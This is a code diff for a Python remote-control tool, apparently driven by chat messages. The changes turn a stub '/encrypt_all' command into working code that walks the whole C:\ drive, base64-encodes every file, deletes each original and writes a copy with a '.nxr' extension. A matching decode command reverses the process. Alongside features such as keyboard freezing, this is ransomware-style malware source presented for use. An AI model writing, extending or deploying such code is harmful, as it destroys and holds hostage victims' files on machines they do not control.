@@ -79,19 +79,25 @@ def encode(file):
 	f = open(file)
 	data = f.read()
 	f.close()
-	string = base64.b64encode(data)
-	#convert = base64.b64decode(string)
+	encodedBytes = base64.b64encode(data)
+	#remove old file
+	os.remove(file)
+	#tag new file
+	file = file + '.nxr'
 	t = open(file, "w+")
-	t.write(string)
+	t.write(encodedBytes)
 	t.close()
 def decode(file):
 	f = open(file)
 	data = f.read()
 	f.close()
-	#string = base64.b64encode(data)
-	string = base64.b64decode(string)
+	decodedBytes = base64.b64decode(data)
+	#remove old file
+	os.remove(file)
+	#tag new file
+	file = file.replace('.nxr', '')
 	t = open(file, "w+")
-	t.write(string)
+	t.write(decodedBytes)
 	t.close()
 def runStackedSchedule(everyNSeconds):
 	for k in schedule.keys():
@@ -200,8 +206,16 @@ def handle(msg):
 							response = 'Found in hide_folder: ' + hide_folder
 						except:
 							response = 'Could not find ' + path_file
-			elif command == '/encrypt_all': #WIP
-				response = 'Not implemented'
+			elif command.endswith('code_all'):
+				parentDirectory = 'C:\\'
+				for root, dirs, files in os.walk(parentDirectory):
+					for afile in files:
+						full_path = os.path.join(root, afile)
+						if command.startswith('/en'):
+							encode(full_path)
+						elif command.startswith('/de') and full_path.endswith('.nxr'):#our extension (been encoded)
+							decode(full_path)
+				response = 'Files ' + command[1:3] + 'coded succesfully.'
 			elif command.endswith('freeze_keyboard'):
 				global keyboardFrozen
 				keyboardFrozen = not command.startswith('/un')
